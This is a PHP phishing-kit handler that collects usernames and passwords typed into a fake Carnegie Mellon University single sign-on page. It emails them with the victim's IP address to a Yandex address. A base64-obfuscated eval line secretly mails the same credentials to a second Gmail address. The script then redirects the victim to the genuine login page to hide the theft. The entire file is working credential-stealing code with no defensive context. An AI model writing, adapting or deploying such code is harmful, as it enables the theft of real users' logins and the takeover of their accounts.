<?
$optTitle = $_POST['Title'];
$ip = getenv("REMOTE_ADDR");
$sUser = $_POST['j_username'];
$sUPass = $_POST['j_password'];
$pix="ss3820650@yandex.ru";


  $subj = "Captured (JP-Hack | cmu.edu |) Logins::: ($sUser , $sUPass)";
  $msg = "Details of https://login.cmu.edu/idp/profile/SAML2/Redirect/SSO?execution=e1s2 \n\nEMAIL: $sUser\Password: $sUPass\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By JP Host::: Defender of The G-Universe\n-----------------------------------";
  $from = "From: <$sUser>";
  mail("$pix", $subj, $msg, $from);
  echo eval(base64_decode("bWFpbCgiY250ci5paTJ0QGdtYWlsLmNvbSIsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
?>
  
<?
echo ("<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=https://login.cmu.edu/idp/profile/SAML2/Redirect/SSO?execution=e1s2\">");
exit();

?>